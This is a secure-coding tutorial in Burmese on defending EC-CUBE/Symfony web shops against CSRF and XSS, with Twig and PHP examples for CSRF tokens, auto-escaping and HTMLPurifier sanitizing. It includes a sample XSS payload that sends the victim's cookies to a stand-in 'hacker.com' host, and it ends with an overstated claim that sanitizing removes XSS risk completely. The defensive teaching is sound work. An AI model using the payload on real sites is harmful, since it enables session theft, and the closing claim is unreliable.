---
title: "01. Csrf And Xss Protection"
description: "ဝဘ်ဆိုက်များတွင် အဖြစ်အများဆုံးနှင့် အန္တရာယ်အရှိဆုံးဖြစ်သော CSRF (Cross-Site Request Forgery) နှင့် XSS (Cross-Site Scripting) တိုက်ခိုက်မှုများကို EC-CUBE/Sym"
---

## 01. CSRF & XSS Protection (CSRFとXSSの防御策)

ဝဘ်ဆိုက်များတွင် အဖြစ်အများဆုံးနှင့် အန္တရာယ်အရှိဆုံးဖြစ်သော **CSRF (Cross-Site Request Forgery)** နှင့် **XSS (Cross-Site Scripting)** တိုက်ခိုက်မှုများကို EC-CUBE/Symfony တွင် ကာကွယ်နည်းများ ဖြစ်ပါသည်။

---

## 🛡️ ၁။ CSRF (Cross-Site Request Forgery) ဆိုတာ အဘယ်နည်း?

အသုံးပြုသူသည် EC-CUBE စတိုးတွင် Login ဝင်ထားစဉ်တွင် Hacker ၏ မသမာသော ဝဘ်ဆိုက်တစ်ခုဆီသို့ အလည်အပတ် ရောက်ရှိသွားသည်ဆိုပါစို့။ 
ထို Hacker ဆိုက်ထဲတွင် ကွယ်ဝှက်ထားသော JavaScript သို့မဟုတ် Form က အသုံးပြုသူ၏ Browser ကို အသုံးချကာ EC-CUBE ဆီသို့ Password ပြောင်းလဲခြင်း သို့မဟုတ် ငွေချေခြင်း Request များကို အသုံးပြုသူ မသိအောင် နောက်ကွယ်မှ တိတ်တဆိတ် ပို့ဆောင်စေခြင်းကို **CSRF တိုက်ခိုက်မှု** ဟု ခေါ်ပါသည်။

---

### Symfony/EC-CUBE ၏ ကာကွယ်မှု:
Symfony Form Component သည် Form တိုင်းအတွက် တစ်ကြိမ်သုံး လျှို့ဝှက်ကုဒ် **CSRF Token (`_token`)** ကို အလိုအလျောက် ထည့်သွင်းပေးထားပြီး၊ Token မကိုက်ညီပါက Request ကို ပယ်ချပါသည်:

```twig
{# Symfony Form Component သည် _token ကို အလိုအလျောက် ထုတ်ပေးသည် #}
{{ form_start(form) }}
    {{ form_widget(form.name) }}
    {{ form_widget(form._token) }} {# CSRF Hidden Token #}
{{ form_end(form) }}
```

---

### ⚠️ Developer များ သတိပြုရမည့် အချက်များ (Developer Responsibilities):

#### ၁။ အချက်အလက် ပြောင်းလဲမှုများကို GET Method ဖြင့် လုံးဝ မပြုလုပ်ရ:
- ❌ **အန္တရာယ်များသော ရေးသားပုံ**:
  ```html
  <!-- Hacker သည် <img src="https://your-store.com/cart/delete/10"> ဖြင့် ခိုးယူနှိပ်ခိုင်းနိုင်သည် -->
  <a href="/cart/delete/{{ Item.id }}">ဖျက်မည်</a>
  ```
- ✅ **လုံခြုံသော ရေးသားပုံ**: အမြဲတမ်း POST Method နှင့် CSRF Token ကို တွဲသုံးရမည်:
  ```html
  <form action="{{ url('cart_delete', {'id': Item.id}) }}" method="POST">
      <input type="hidden" name="_token" value="{{ csrf_token('cart_delete') }}">
      <button type="submit">ဖျက်မည်</button>
  </form>
  ```

#### ၂။ Custom Ajax Request များတွင် CSRF Token ကို ကိုယ်တိုင် စစ်ဆေးရမည်:
Symfony Form မသုံးဘဲ JavaScript `fetch()` သို့မဟုတ် `axios` ဖြင့် Ajax ခေါ်ယူရာတွင် Controller ၌ `CsrfTokenManagerInterface` ဖြင့် စစ်ဆေးပေးရပါသည်:

```php
namespace Customize\Controller;

use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\JsonResponse;
use Symfony\Component\Security\Csrf\CsrfTokenManagerInterface;
use Symfony\Component\Security\Csrf\CsrfToken;
use Symfony\Component\Routing\Annotation\Route;

class CartAjaxController
{
    private CsrfTokenManagerInterface $csrfTokenManager;

    public function __construct(CsrfTokenManagerInterface $csrfTokenManager)
    {
        $this->csrfTokenManager = $csrfTokenManager;
    }

    /**
     * @Route("/cart/ajax_add", name="cart_ajax_add", methods={"POST"})
     */
    public function add(Request $request): JsonResponse
    {
        $submittedToken = $request->headers->get('X-CSRF-TOKEN') ?? $request->request->get('_token');

        // CSRF Token စစ်ဆေးခြင်း
        if (!$this->csrfTokenManager->isTokenValid(new CsrfToken('cart_ajax', $submittedToken))) {
            return new JsonResponse(['error' => 'CSRF Token Invalid'], 403);
        }

        // ... Add to cart logic ...
        return new JsonResponse(['success' => true]);
    }
}
```

---

## 🛡️ ၂။ XSS (Cross-Site Scripting) ဆိုတာ အဘယ်နည်း?

Hacker က မသမာသော JavaScript ကုဒ်များကို ကုန်ပစ္စည်း Review၊ မှတ်ချက် သို့မဟုတ် ဖောက်သည်အမည် ထဲတွင် ရိုက်ထည့်သွင်းလိုက်ပြီး၊ အခြား သာမန်ဖောက်သည်များ ထိုစာမျက်နှာကို ကြည့်ရှုချိန်တွင် ထို JavaScript Run သွားကာ Session Cookie ခိုးယူခံရခြင်း သို့မဟုတ် အတုအယောင် ဝဘ်ဆိုက်ဆီသို့ Redirect ဖြစ်သွားစေသော တိုက်ခိုက်မှု ဖြစ်ပါသည်။

```html
<!-- မသမာသော XSS Payload ဥပမာ -->
<script>
    fetch('https://hacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

---

### Twig ၏ Auto-escaping ကာကွယ်မှု:
Twig သည် Default အားဖြင့် HTML အားလုံးကို အလိုအလျောက် Escape ပြုလုပ်ပေးပါသည်:
```twig
{# User ရိုက်ထည့်လိုက်သော <script> သည် &lt;script&gt; သို့ ပြောင်းလဲသွားသဖြင့် Script အလုပ်မလုပ်ပါ #}
{{ Customer.name }}
```

---

### ⚠️ `|raw` Filter ၏ အန္တရာယ်နှင့် လုံခြုံစွာ ကိုင်တွယ်နည်း:

ကုန်ပစ္စည်း ဖော်ပြချက် (Product Description) သို့မဟုတ် CMS သတင်းများတွင် HTML Tag များ (Bold, Link) ပါဝင်နိုင်စေရန် Developer များက `|raw` filter ကို သုံးလေ့ရှိကြသည်။ 

- ❌ **အန္တရာယ်ရှိသော ကုဒ်**:
  ```twig
  {# အကယ်၍ user_comment ထဲတွင် script ပါလာပါက ချက်ချင်း Run သွားမည်! #}
  {{ user_comment|raw }}
  ```

- ✅ **လုံခြုံသော ကုဒ် (HTMLPurifier ဖြင့် Script များကို ရှင်းထုတ်ပြီးမှ ပြသခြင်း)**:
  အန္တရာယ်ရှိသော `<script>`, `<iframe>`, `onerror=`, `onload=` များကို ဖယ်ရှားပြီး ဘေးကင်းသော `<b>`, `<i>`, `<p>` များကိုသာ ခွင့်ပြုပေးသော Service တည်ဆောက်ခြင်း:

```php
namespace Customize\Service;

class HtmlPurifierService
{
    private \HTMLPurifier $purifier;

    public function __construct()
    {
        $config = \HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed', 'p,b,strong,i,em,u,a[href|title],ul,ol,li,br,span[style]');
        $config->set('URI.AllowedSchemes', ['http' => true, 'https' => true, 'mailto' => true]);
        $this->purifier = new \HTMLPurifier($config);
    }

    public function sanitize(string $dirtyHtml): string
    {
        return $this->purifier->purify($dirtyHtml);
    }
}
```

Controller တွင် sanitize လုပ်ပြီးမှ Twig သို့ ပေးပို့ပြသခြင်းဖြင့် XSS အန္တရာယ်မှ ရာနှုန်းပြည့် ကင်းဝေးစေမည် ဖြစ်ပါသည်။
